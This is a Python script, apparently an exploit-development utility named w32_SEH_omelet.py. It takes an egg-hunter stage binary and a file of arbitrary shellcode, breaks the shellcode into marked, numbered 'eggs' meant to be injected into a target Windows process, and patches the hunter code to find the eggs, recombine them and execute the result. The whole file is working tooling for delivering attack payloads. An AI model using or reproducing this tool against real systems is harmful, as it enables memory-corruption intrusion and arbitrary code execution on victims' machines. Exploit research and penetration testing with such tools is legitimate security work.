import math
import sys

def HexEncode(string):
  result = ''
  for char in string:
    result += '\\x%02X' % ord(char)
  return result

def Main(my_name, bin_file, shellcode_file, output_file, egg_size = '0x7F', marker_bytes = '0x280876'):
  if (marker_bytes.startswith('0x')):
    marker_bytes = int(marker_bytes[2:], 16)
  else:
    marker_bytes = int(marker_bytes)
  if (egg_size.startswith('0x')):
    egg_size = int(egg_size[2:], 16)
  else:
    egg_size = int(egg_size)
  assert marker_bytes <= 0xFFFFFF, 'Marker must fit into 3 bytes.'
  assert egg_size >= 6, 'Eggs cannot be less than 6 bytes.'
  assert egg_size <= 0x7F, 'Eggs cannot be more than 0x7F (127) bytes.'
    
  bin = open(bin_file).read()
  marker_bytes_location = ord(bin[-3])
  max_index_location = ord(bin[-2])
  egg_size_location = ord(bin[-1])
  code = bin[:-3]

  shellcode = open(shellcode_file).read()
  
  max_index = int(math.ceil(len(shellcode) / (egg_size - 5.0)))
  assert max_index <= 0xFF, ('The shellcode would require %X (%d) eggs of  %X '
      '(%d) bytes, but 0xFF (255) is the maximum number of eggs.') % (
      max_index, max_index, egg_size, egg_size)
  
  marker_bytes_string = ''
  for i in range(0,3):
    marker_bytes_string += chr(marker_bytes & 0xFF)
    marker_bytes >>= 8

  max_index_string = chr(max_index)
  egg_size_string = chr(egg_size - 5)
  # insert variables into code
  code = code[:marker_bytes_location] + marker_bytes_string + code[marker_bytes_location+3:]
  code = code[:max_index_location] + max_index_string + code[max_index_location+1:]
  code = code[:egg_size_location] + egg_size_string + code[egg_size_location+1:]
  output = [
    '// This is the binary code that needs to be executed to find the eggs, ',
    '// recombine the orignal shellcode and execute it. It is %d bytes:' % (
      len(code),),
    'omelet_code = "%s";' % HexEncode(code),
    '',
    '// These are the eggs that need to be injected into the target process ',
    '// for the omelet shellcode to be able to recreate the original shellcode',
    '// (you can insert them as many times as you want, as long as each one is',
    '// inserted at least once). They are %d bytes each:' % (egg_size,) ]
  egg_index = 0 
  while shellcode:
    egg = egg_size_string + chr(egg_index ^ 0xFF) + marker_bytes_string
    egg += shellcode[:egg_size - 5]
    if len(egg) < egg_size:
      # tail end of shellcode is smaller than an egg: add pagging:
      egg += '@' * (egg_size - len(egg))
    output.append('egg%d = "%s";' % (egg_index, HexEncode(egg)))
    shellcode = shellcode[egg_size - 5:]
    egg_index += 1
  open(output_file, 'w').write('\n'.join(output))

if __name__ == '__main__':
  if len(sys.argv) == 1 or sys.argv[1] in ('-h', '-?', '/h', '/?'):
    print """Syntax:
    w32_SEH_omelet.py "omelet bin file" "shellcode bin file" "output txt file"
        [egg size] [marker bytes]

Where:
    omelet bin file = The omelet shellcode stage binary code followed by three
                      bytes of the offsets of the "marker bytes", "max index" 
                      and "egg size" variables in the code.
    shellcode bin file = The shellcode binary code you want to have stored in 
                      the eggs and reconstructed by the omelet shellcode stage
                      code.
    output txt file = The file you want the omelet egg-hunt code and the eggs
                      to be written to (in text format).
    egg size =        The size of each egg (legal values: 6-127, default: 127)
    marker bytes =    The value you want to use as a marker to distinguish the
                      eggs from other data in user-land address space (legal
                      values: 0-0xFFFFFF, default value: 0x280876)
"""
  assert len(sys.argv) >= 4 and len(sys.argv) <= 6, (
      'Incorrect arguments; run "w32_SEH_omelet.py -?" for help.')
  exit(Main(*sys.argv))